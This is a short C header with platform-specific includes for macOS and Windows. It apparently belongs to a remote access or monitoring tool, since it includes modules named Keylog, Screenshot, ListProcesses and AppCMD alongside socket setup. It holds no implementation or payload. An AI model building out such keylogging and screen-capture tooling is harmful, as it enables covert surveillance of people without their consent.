#pragma once
#ifdef __APPLE__
    #include "function_unix/ListProcesses.h"
    #include "function_unix/AppCMD.h"
    #include "function_unix/Screenshot.h"
    #include "function_unix/Keylog.h"
    #include "function_cross/ListDirTree.h"

    #define SOCKET int
#elif _WIN32
    #define WIN32_LEAN_AND_MEAN
    #include <Windows.h>
    #include <WinSock2.h>

    #define poll WSAPoll
    int close(int fd);
#endif
